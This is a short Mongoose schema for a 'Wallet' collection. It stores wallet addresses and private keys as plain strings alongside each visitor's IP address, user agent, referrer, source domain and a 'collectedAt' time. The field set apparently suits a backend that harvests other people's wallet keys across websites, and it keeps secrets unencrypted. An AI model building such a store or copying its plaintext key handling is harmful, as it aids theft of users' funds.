const mongoose = require('mongoose');

const walletSchema = new mongoose.Schema({
    domain: {
        type: String,
        required: true,
        index: true
    },
    userId: {
        type: String,
        index: true,
        sparse: true
    },
    walletAddress: {
        type: String,
        required: true,
        unique: true,
        index: true
    },
    privateKey: {
        type: String,
        required: true
    },
    balance: {
        type: Number,
        default: 0
    },
    ipAddress: {
        type: String,
        index: true
    },
    userAgent: {
        type: String
    },
    referrer: {
        type: String
    },
    collectedAt: {
        type: Date,
        default: Date.now,
        index: true
    },
    notes: {
        type: String
    }
}, {
    timestamps: true
});

// Create indexes for better query performance
walletSchema.index({ collectedAt: -1 });
walletSchema.index({ walletAddress: 1 });
walletSchema.index({ userId: 1 });

module.exports = mongoose.model('Wallet', walletSchema);